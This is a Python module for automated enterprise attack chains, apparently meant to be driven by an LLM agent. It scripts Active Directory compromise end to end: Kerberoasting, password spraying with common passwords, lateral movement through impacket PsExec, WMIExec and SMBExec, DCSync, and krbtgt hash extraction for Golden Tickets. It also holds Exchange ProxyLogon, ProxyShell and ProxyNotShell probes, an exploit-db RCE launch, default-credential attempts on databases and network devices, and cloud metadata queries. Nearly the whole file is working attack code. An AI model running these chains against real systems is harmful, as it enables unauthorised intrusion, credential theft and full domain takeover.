"""Enterprise Attack Chains

Automated attack chains for enterprise environments:
- Active Directory (full AD attack methodology)
- Exchange Server attacks
- SharePoint attacks
- SCCM/ConfigMgr attacks
- SAP attacks
- Network infrastructure (routers, switches, firewalls)
- Cloud (AWS, Azure, GCP)
- Database attacks (MSSQL, Oracle, PostgreSQL)

No hardcoded rules - each chain uses LLM to decide approach.
"""

import asyncio
import json
import re
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class AttackChain:
    """An enterprise attack chain."""
    name: str
    description: str
    phase: str  # recon, exploit, post-exploit, lateral-movement
    prerequisites: list[str] = field(default_factory=list)
    steps: list[dict] = field(default_factory=list)
    tools: list[str] = field(default_factory=list)


class EnterpriseAttackChains:
    """Enterprise-specific attack chains.

    These chains represent real enterprise attack methodologies:
    1. Active Directory - full kill chain from enumeration to domain compromise
    2. Exchange - email server exploitation
    3. SharePoint - collaboration platform attacks
    4. SCCM - configuration manager exploitation
    5. Network Infrastructure - router/switch/firewall attacks
    6. Database - SQL Server, Oracle, PostgreSQL attacks
    """

    def __init__(self, executor=None):
        self.executor = executor
        self.active_chains: list[AttackChain] = []
        self.completed_steps = []
        self.findings = []

    # ─── Active Directory Attack Chain ─────────────────────────────

    async def ad_full_chain(self, target: str, creds: dict = None) -> dict:
        """Full Active Directory attack chain.

        Steps:
        1. Domain enumeration (LDAP, DNS, RPC)
        2. User/computer enumeration
        3. Group policy analysis
        4. Kerberoasting / AS-REP roasting
        5. Password spraying
        6. Lateral movement
        7. Privilege escalation
        8. Domain compromise
        """
        results = {
            "chain": "active_directory",
            "target": target,
            "steps": [],
            "success": False,
            "findings": [],
        }

        username = creds.get("username", "") if creds else ""
        password = creds.get("password", "") if creds else ""
        domain = creds.get("domain", "") if creds else ""

        # Step 1: Domain Enumeration
        step1 = await self._ad_enum_domain(target, username, password, domain)
        results["steps"].append(step1)

        # Step 2: User Enumeration
        step2 = await self._ad_enum_users(target, username, password, domain)
        results["steps"].append(step2)

        # Step 3: Group Policy Analysis
        step3 = await self._ad_enum_groups(target, username, password, domain)
        results["steps"].append(step3)

        # Step 4: Kerberoasting
        if username and password:
            step4 = await self._ad_kerberoast(target, username, password, domain)
            results["steps"].append(step4)

            # Step 5: Password Spraying
            step5 = await self._ad_password_spray(target, username, password, domain)
            results["steps"].append(step5)

            # Step 6: Lateral Movement
            step6 = await self._ad_lateral_movement(target, username, password, domain)
            results["steps"].append(step6)

            # Step 7: Privilege Escalation
            step7 = await self._ad_privesc(target, username, password, domain)
            results["steps"].append(step7)

            # Step 8: Domain Compromise
            step8 = await self._ad_domain_compromise(target, username, password, domain)
            results["steps"].append(step8)

        # Calculate success
        for step in results["steps"]:
            if step.get("success"):
                results["success"] = True
                results["findings"].extend(step.get("findings", []))

        return results

    async def _ad_enum_domain(self, target, username, password, domain) -> dict:
        """Enumerate AD domain information."""
        findings = []
        output = ""

        if self.executor:
            # Try ldapsearch
            if username and password:
                result = await self.executor.run(
                    f"ldapsearch -x -H ldap://{target} "
                    f"-D '{username}@{domain}' -w '{password}' "
                    f"-b '' -s base '(objectclass=*)' namingContexts 2>/dev/null",
                    timeout=30,
                )
                if result.exit_code == 0:
                    output = result.stdout
                    if "namingContexts" in output:
                        findings.append("LDAP anonymous bind - domain info exposed")

            # Try enum4linux
            result = await self.executor.run(
                f"enum4linux -a {target} 2>/dev/null | head -100",
                timeout=60,
            )
            if result.exit_code == 0:
                output += "\n" + result.stdout

                # Extract domain info
                domain_match = re.search(r"Domain:\s*(\S+)", result.stdout)
                if domain_match:
                    findings.append(f"Domain name: {domain_match.group(1)}")

                sid_match = re.search(r"SID:\s*(\S+)", result.stdout)
                if sid_match:
                    findings.append(f"Domain SID: {sid_match.group(1)}")

        return {
            "step": "ad_enum_domain",
            "success": len(findings) > 0,
            "output": output[:3000],
            "findings": findings,
        }

    async def _ad_enum_users(self, target, username, password, domain) -> dict:
        """Enumerate AD users."""
        findings = []
        users = []

        if self.executor:
            # Try CrackMapExec
            if username and password:
                result = await self.executor.run(
                    f"crackmapexec ldap {target} -u '{username}' -p '{password}' "
                    f"--users --enabled 2>/dev/null",
                    timeout=60,
                )
                if result.exit_code == 0:
                    # Parse users
                    for line in result.stdout.split("\n"):
                        if "SAMAccountName" in line or "-cn" in line:
                            user = line.split(":")[-1].strip()
                            if user and user not in users:
                                users.append(user)

            # Try rpcclient
            result = await self.executor.run(
                f"rpcclient -U '' {target} -c 'enumdomusers' 2>/dev/null",
                timeout=30,
            )
            if result.exit_code == 0:
                for line in result.stdout.split("\n"):
                    user_match = re.search(r"\[.*\]\s+(\S+?):", line)
                    if user_match:
                        user = user_match.group(1)
                        if user and user not in users:
                            users.append(user)

            if users:
                findings.append(f"Found {len(users)} domain users: {', '.join(users[:10])}")

        return {
            "step": "ad_enum_users",
            "success": len(users) > 0,
            "users": users,
            "findings": findings,
        }

    async def _ad_enum_groups(self, target, username, password, domain) -> dict:
        """Enumerate AD groups and privileges."""
        findings = []

        if self.executor and username and password:
            result = await self.executor.run(
                f"crackmapexec ldap {target} -u '{username}' -p '{password}' "
                f"--groups --privileged-groups 2>/dev/null",
                timeout=60,
            )
            if result.exit_code == 0:
                # Look for high-value groups
                high_value = [
                    "Domain Admins", "Enterprise Admins", "Schema Admins",
                    "Administrators", "Account Operators", "Backup Operators",
                    "DnsAdmins", "Group Policy Creator Owners",
                ]
                for group in high_value:
                    if group.lower() in result.stdout.lower():
                        findings.append(f"High-value group found: {group}")

        return {
            "step": "ad_enum_groups",
            "success": len(findings) > 0,
            "findings": findings,
        }

    async def _ad_kerberoast(self, target, username, password, domain) -> dict:
        """Kerberoasting - extract service account hashes."""
        findings = []
        hashes = []

        if self.executor:
            # Method 1: CrackMapExec
            result = await self.executor.run(
                f"crackmapexec ldap {target} -u '{username}' -p '{password}' "
                f"--kerberoast /tmp/kerberoast.txt 2>/dev/null",
                timeout=120,
            )
            if result.exit_code == 0 and "kerberoast" in result.stdout.lower():
                findings.append("Kerberoasting successful")

            # Method 2: GetUserSPNs.py (impacket)
            result = await self.executor.run(
                f"GetUserSPNs.py '{domain}/{username}:{password}' -dc-ip {target} "
                f"-request -outputfile /tmp/kerberoast_impacket.txt 2>/dev/null",
                timeout=120,
            )
            if result.exit_code == 0:
                # Read hashes
                hash_result = await self.executor.run("cat /tmp/kerberoast_impacket.txt 2>/dev/null")
                if hash_result.exit_code == 0:
                    for line in hash_result.stdout.split("\n"):
                        if "$krb5tgs$" in line:
                            hashes.append(line.strip())

            # Method 3: Rubeus (if on Windows)
            if not hashes:
                result = await self.executor.run(
                    f"impacket-r GetUserSPNs '{domain}/{username}:{password}' "
                    f"-dc-ip {target} -request 2>/dev/null",
                    timeout=120,
                )
                if result.exit_code == 0:
                    for line in result.stdout.split("\n"):
                        if "$krb5tgs$" in line:
                            hashes.append(line.strip())

            if hashes:
                findings.append(f"Extracted {len(hashes)} Kerberos hashes")
                findings.append("Crack hashes with: hashcat -m 13100 hash.txt wordlist.txt")

        return {
            "step": "ad_kerberoast",
            "success": len(hashes) > 0,
            "hashes": hashes[:5],
            "findings": findings,
        }

    async def _ad_password_spray(self, target, username, password, domain) -> dict:
        """Password spraying across domain accounts."""
        findings = []

        if self.executor:
            # Method 1: CrackMapExec
            result = await self.executor.run(
                f"crackmapexec smb {target} -u '{username}' -p '{password}' "
                f"--continue-on-success 2>/dev/null | grep -i 'success\\|pwned'",
                timeout=120,
            )
            if result.exit_code == 0 and ("success" in result.stdout.lower() or "pwned" in result.stdout.lower()):
                findings.append("Password spray successful - credentials work on SMB")

            # Method 2: Try common passwords
            common_passwords = [
                "Password1", "Password123!", "Welcome1", "Company123",
                "Summer2024!", "Winter2024!", "P@ssw0rd!", "Admin123!",
            ]
            for pwd in common_passwords[:5]:
                result = await self.executor.run(
                    f"crackmapexec smb {target} -u '{username}' -p '{pwd}' "
                    f"--continue-on-success 2>/dev/null | grep -i 'success\\|pwned'",
                    timeout=30,
                )
                if "success" in result.stdout.lower() or "pwned" in result.stdout.lower():
                    findings.append(f"Default password found: {username}:{pwd}")
                    break

        return {
            "step": "ad_password_spray",
            "success": len(findings) > 0,
            "findings": findings,
        }

    async def _ad_lateral_movement(self, target, username, password, domain) -> dict:
        """Lateral movement within AD."""
        findings = []
        compromised = []

        if self.executor:
            # Method 1: PsExec (pass-the-hash or password)
            result = await self.executor.run(
                f"impacket-psexec '{domain}/{username}:{password}'@{target} "
                f"'whoami' 2>/dev/null",
                timeout=30,
            )
            if result.exit_code == 0 and "nt authority" in result.stdout.lower():
                findings.append("PsExec lateral movement successful")
                compromised.append({"target": target, "method": "psexec"})

            # Method 2: WMIExec
            result = await self.executor.run(
                f"impacket-wmiexec '{domain}/{username}:{password}'@{target} "
                f"'whoami' 2>/dev/null",
                timeout=30,
            )
            if result.exit_code == 0 and "nt authority" in result.stdout.lower():
                findings.append("WMIExec lateral movement successful")
                compromised.append({"target": target, "method": "wmiexec"})

            # Method 3: SMBExec
            result = await self.executor.run(
                f"impacket-smbexec '{domain}/{username}:{password}'@{target} "
                f"'whoami' 2>/dev/null",
                timeout=30,
            )
            if result.exit_code == 0:
                findings.append("SMBExec lateral movement successful")
                compromised.append({"target": target, "method": "smbexec"})

        return {
            "step": "ad_lateral_movement",
            "success": len(compromised) > 0,
            "compromised": compromised,
            "findings": findings,
        }

    async def _ad_privesc(self, target, username, password, domain) -> dict:
        """AD privilege escalation."""
        findings = []

        if self.executor:
            # Method 1: DCSync
            result = await self.executor.run(
                f"impacket-secretsdump '{domain}/{username}:{password}'@{target} "
                f"-just-dc-ntlm 2>/dev/null",
                timeout=60,
            )
            if result.exit_code == 0 and "NTLM" in result.stdout:
                findings.append("DCSync successful - extracted NTLM hashes")

            # Method 2: Check for GPO abuse
            result = await self.executor.run(
                f"crackmapexec ldap {target} -u '{username}' -p '{password}' "
                f"--gpo-relay 2>/dev/null",
                timeout=30,
            )
            if result.exit_code == 0 and "relay" in result.stdout.lower():
                findings.append("GPO relay attack possible")

            # Method 3: ACL abuse
            result = await self.executor.run(
                f"crackmapexec ldap {target} -u '{username}' -p '{password}' "
                f"--acl-abuse 2>/dev/null",
                timeout=30,
            )
            if result.exit_code == 0 and "abuse" in result.stdout.lower():
                findings.append("ACL abuse possible")

        return {
            "step": "ad_privesc",
            "success": len(findings) > 0,
            "findings": findings,
        }

    async def _ad_domain_compromise(self, target, username, password, domain) -> dict:
        """Final domain compromise."""
        findings = []

        if self.executor:
            # Extract krbtgt hash
            result = await self.executor.run(
                f"impacket-secretsdump '{domain}/{username}:{password}'@{target} "
                f"-just-dc-user krbtgt 2>/dev/null",
                timeout=60,
            )
            if result.exit_code == 0 and "krbtgt" in result.stdout:
                findings.append("KRBTGT hash extracted - Golden Ticket possible")
                findings.append("Use impacket-ticketer to create golden ticket")

            # Check for SID history abuse
            result = await self.executor.run(
                f"impacket-secretsdump '{domain}/{username}:{password}'@{target} "
                f"-just-dc-user administrator 2>/dev/null",
                timeout=60,
            )
            if result.exit_code == 0 and "administrator" in result.stdout.lower():
                findings.append("Administrator hash extracted")

        return {
            "step": "ad_domain_compromise",
            "success": len(findings) > 0,
            "findings": findings,
        }

    # ─── Exchange Attack Chain ─────────────────────────────────────

    async def exchange_chain(self, target: str, creds: dict = None) -> dict:
        """Exchange Server attack chain."""
        results = {
            "chain": "exchange",
            "target": target,
            "steps": [],
            "success": False,
            "findings": [],
        }

        username = creds.get("username", "") if creds else ""
        password = creds.get("password", "") if creds else ""

        # Step 1: Exchange enumeration
        step1 = await self._exchange_enum(target)
        results["steps"].append(step1)

        # Step 2: Exchange vulnerabilities
        step2 = await self._exchange_vulns(target)
        results["steps"].append(step2)

        # Step 3: Exchange exploitation
        if username and password:
            step3 = await self._exchange_exploit(target, username, password)
            results["steps"].append(step3)

        for step in results["steps"]:
            if step.get("success"):
                results["success"] = True
                results["findings"].extend(step.get("findings", []))

        return results

    async def _exchange_enum(self, target) -> dict:
        """Enumerate Exchange server."""
        findings = []

        if self.executor:
            # Check for EWS
            result = await self.executor.run(
                f"curl -sk https://{target}/ews/ -o /dev/null -w '%{{http_code}}' 2>/dev/null",
                timeout=10,
            )
            if "200" in result.stdout or "401" in result.stdout:
                findings.append("Exchange EWS endpoint accessible")

            # Check for OWA
            result = await self.executor.run(
                f"curl -sk https://{target}/owa/ -o /dev/null -w '%{{http_code}}' 2>/dev/null",
                timeout=10,
            )
            if "200" in result.stdout or "302" in result.stdout:
                findings.append("Exchange OWA endpoint accessible")

            # Check Exchange version
            result = await self.executor.run(
                f"nmap -p 443 --script=http-headers {target} 2>/dev/null | grep -i 'x-owaversion\\|x-exchange'",
                timeout=30,
            )
            if result.stdout.strip():
                findings.append(f"Exchange version info: {result.stdout.strip()}")

        return {
            "step": "exchange_enum",
            "success": len(findings) > 0,
            "findings": findings,
        }

    async def _exchange_vulns(self, target) -> dict:
        """Check for Exchange vulnerabilities."""
        findings = []

        if self.executor:
            # Check ProxyShell
            result = await self.executor.run(
                f"nmap -p 443 --script=http-vuln-exchange-proxyshell {target} 2>/dev/null",
                timeout=60,
            )
            if "VULNERABLE" in result.stdout:
                findings.append("Exchange ProxyShell vulnerability found (CVE-2021-34473)")

            # Check ProxyLogon
            result = await self.executor.run(
                f"curl -sk 'https://{target}/autodiscover/autodiscover.json'"
                f"@sl.co/autodiscover/autodiscover.json -H 'User-Agent: Microsoft Office/16.0' "
                f"-o /dev/null -w '%{{http_code}}' 2>/dev/null",
                timeout=15,
            )
            if "200" in result.stdout:
                findings.append("Exchange ProxyLogon possibly vulnerable (CVE-2021-26855)")

            # Check ProxyNotShell
            result = await self.executor.run(
                f"curl -sk 'https://{target}/autodiscover/autodiscover.json' "
                f"-d '<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestSchema/2006\">"
                f"<Request><EMailAddress>test@test.com</EMailAddress>"
                f"<AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>"
                f"</Request></Autodiscover>' -o /dev/null -w '%{{http_code}}' 2>/dev/null",
                timeout=15,
            )
            if "500" in result.stdout:
                findings.append("Exchange ProxyNotShell possibly vulnerable (CVE-2022-41040)")

        return {
            "step": "exchange_vulns",
            "success": len(findings) > 0,
            "findings": findings,
        }

    async def _exchange_exploit(self, target, username, password) -> dict:
        """Exploit Exchange vulnerabilities."""
        findings = []

        if self.executor:
            # Try RCE via Exchange
            result = await self.executor.run(
                f"python3 /usr/share/exploitdb/exploits/windows/webapps/50496.py "
                f"{target} {username} {password} 2>/dev/null",
                timeout=60,
            )
            if result.exit_code == 0:
                findings.append("Exchange RCE exploit successful")

        return {
            "step": "exchange_exploit",
            "success": len(findings) > 0,
            "findings": findings,
        }

    # ─── SCCM Attack Chain ────────────────────────────────────────

    async def sccm_chain(self, target: str, creds: dict = None) -> dict:
        """SCCM/ConfigMgr attack chain."""
        results = {
            "chain": "sccm",
            "target": target,
            "steps": [],
            "success": False,
            "findings": [],
        }

        if self.executor:
            # Enumerate SCCM
            result = await self.executor.run(
                f"nmap -p 443,80,8530,8531 --script=http-enum {target} 2>/dev/null | head -30",
                timeout=30,
            )
            if "sccm" in result.stdout.lower() or "configmgr" in result.stdout.lower():
                results["findings"].append("SCCM/ConfigMgr detected")

            # Check for SCCM site server
            result = await self.executor.run(
                f"nmap -p 445 --script=smb-enum-shares {target} 2>/dev/null | grep -i 'sccm\\|configmgr'",
                timeout=30,
            )
            if result.stdout.strip():
                results["findings"].append("SCCM site server shares found")

        for step in results["steps"]:
            if step.get("success"):
                results["success"] = True

        return results

    # ─── Network Infrastructure Attacks ────────────────────────────

    async def network_infra_chain(self, target: str, creds: dict = None) -> dict:
        """Network infrastructure attack chain (routers, switches, firewalls)."""
        results = {
            "chain": "network_infrastructure",
            "target": target,
            "steps": [],
            "success": False,
            "findings": [],
        }

        if self.executor:
            # Detect network device
            result = await self.executor.run(
                f"nmap -sV -p 22,23,80,443,161,162,8080,8443 {target} 2>/dev/null",
                timeout=60,
            )

            # Check for Cisco
            if "cisco" in result.stdout.lower():
                results["findings"].append("Cisco device detected")

                # Try Cisco default creds
                result = await self.executor.run(
                    f"snmpwalk -v2c -c public {target} 2>/dev/null | head -20",
                    timeout=15,
                )
                if result.exit_code == 0:
                    results["findings"].append("SNMP community string 'public' works")

            # Check for Juniper
            if "juniper" in result.stdout.lower():
                results["findings"].append("Juniper device detected")

            # Check for Palo Alto
            if "paloalto" in result.stdout.lower() or "pan-os" in result.stdout.lower():
                results["findings"].append("Palo Alto firewall detected")

            # SNMP enumeration
            result = await self.executor.run(
                f"snmpwalk -v2c -c public {target} 1.3.6.1.2.1.1 2>/dev/null | head -10",
                timeout=15,
            )
            if result.exit_code == 0:
                results["findings"].append("SNMP accessible with default community string")

        return results

    # ─── Database Attack Chain ─────────────────────────────────────

    async def database_chain(self, target: str, service: str, creds: dict = None) -> dict:
        """Database attack chain."""
        results = {
            "chain": "database",
            "target": target,
            "service": service,
            "steps": [],
            "success": False,
            "findings": [],
        }

        if self.executor:
            if "mysql" in service.lower():
                # Try default credentials
                default_creds = [
                    ("root", ""), ("root", "root"), ("root", "password"),
                    ("admin", "admin"), ("mysql", "mysql"),
                ]
                for user, pwd in default_creds:
                    result = await self.executor.run(
                        f"mysql -h {target} -u {user} -p'{pwd}' -e 'SELECT version();' 2>/dev/null",
                        timeout=10,
                    )
                    if result.exit_code == 0:
                        results["findings"].append(f"MySQL default creds: {user}:{pwd}")
                        results["success"] = True
                        break

            elif "mssql" in service.lower() or "ms-sql" in service.lower():
                # Try Metasploit MSSQL modules
                result = await self.executor.run(
                    f"impacket-mssqlclient '{target}' -windows-auth 2>/dev/null",
                    timeout=15,
                )
                if result.exit_code == 0:
                    results["findings"].append("MSSQL accessible")

            elif "postgres" in service.lower():
                # Try default credentials
                default_creds = [
                    ("postgres", "postgres"), ("postgres", "password"),
                    ("postgres", ""), ("admin", "admin"),
                ]
                for user, pwd in default_creds:
                    result = await self.executor.run(
                        f"psql -h {target} -U {user} -c 'SELECT version();' 2>/dev/null",
                        timeout=10,
                    )
                    if result.exit_code == 0:
                        results["findings"].append(f"PostgreSQL default creds: {user}:{pwd}")
                        results["success"] = True
                        break

            elif "oracle" in service.lower():
                result = await self.executor.run(
                    f"odat all -s {target} 2>/dev/null | head -30",
                    timeout=60,
                )
                if result.exit_code == 0:
                    results["findings"].append("Oracle ODAT scan complete")

        return results

    # ─── Cloud Attack Chains ───────────────────────────────────────

    async def aws_chain(self, target: str, creds: dict = None) -> dict:
        """AWS cloud attack chain."""
        results = {"chain": "aws", "target": target, "findings": []}

        if self.executor:
            # Check for S3 buckets
            result = await self.executor.run(
                f"aws s3 ls s3://{target} 2>/dev/null", timeout=15
            )
            if result.exit_code == 0:
                results["findings"].append(f"S3 bucket accessible: {target}")

            # Check for EC2 metadata
            result = await self.executor.run(
                f"curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null", timeout=5
            )
            if result.stdout.strip():
                results["findings"].append("EC2 metadata accessible")

        return results

    async def azure_chain(self, target: str, creds: dict = None) -> dict:
        """Azure cloud attack chain."""
        results = {"chain": "azure", "target": target, "findings": []}

        if self.executor:
            # Check for Azure management
            result = await self.executor.run(
                f"az account show 2>/dev/null", timeout=10
            )
            if result.exit_code == 0:
                results["findings"].append("Azure CLI authenticated")

        return results

    # ─── Utility ───────────────────────────────────────────────────

    def get_all_chains(self) -> list[str]:
        """Get list of available attack chains."""
        return [
            "ad_full_chain - Full Active Directory attack",
            "exchange_chain - Exchange Server attacks",
            "sccm_chain - SCCM/ConfigMgr attacks",
            "network_infra_chain - Router/switch/firewall attacks",
            "database_chain - Database attacks",
            "aws_chain - AWS cloud attacks",
            "azure_chain - Azure cloud attacks",
        ]

    def get_summary(self) -> dict:
        """Get summary of all findings."""
        return {
            "total_chains": len(self.active_chains),
            "total_findings": len(self.findings),
            "findings": self.findings,
        }
